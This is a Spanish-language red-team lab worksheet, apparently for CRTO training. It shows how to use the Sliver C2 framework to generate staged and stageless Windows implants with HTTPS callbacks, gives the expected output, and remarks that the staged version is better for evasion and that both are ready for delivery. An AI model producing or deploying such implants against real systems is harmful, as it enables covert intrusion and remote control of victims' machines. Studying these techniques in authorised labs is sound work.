# Fase-03 · Payload Generation (Staged vs Stageless)

> Bloque CRTO: Payloads  
> Concepto: Generar stager y stageless, entender diferencias

---

## 🎯 Objetivo

Generar dos versiones de payload:
1. **Staged** (pequeño, descarga el beacon en tiempo de ejecución)
2. **Stageless** (completo, todo en un binario)

## 📋 Prerequisitos

- Team server activo
- Listener HTTPS creado (Fase 02)

## 🔨 Ejecución

### Paso 1: Generar payload STAGED

```bash
sliver > generate --os windows --arch amd64 --format exe --https 0.0.0.0:443 --staged
```

**Esperado:**
```
[*] Sliver implant generated: /tmp/sliver_XXXXXXX_windows_amd64.exe
[*] Size: 43 KB (staged stager)
```

**Captura:** `FASE-03/fase-03-01-payload-staged.png`

### Paso 2: Generar payload STAGELESS

```bash
sliver > generate --os windows --arch amd64 --format exe --https 0.0.0.0:443
```

**Esperado:**
```
[*] Sliver implant generated: /tmp/sliver_YYYYYYY_windows_amd64.exe
[*] Size: 320 KB (stageless)
```

**Captura:** `FASE-03/fase-03-02-payload-stageless.png`

### Paso 3: Comparar tamaños

```bash
ls -lh /tmp/sliver_*_windows_amd64.exe
```

**Captura:** `FASE-03/fase-03-03-tamaño-comparison.png`

## 🏁 Resultado

✅ Payload staged generado (~40 KB)  
✅ Payload stageless generado (~320 KB)  
✅ Ambos listos para entrega

## 📝 Notas

- **Staged:** mejor para evasión (pequeño tamaño)
- **Stageless:** mejor para confiabilidad (no depende de descarga)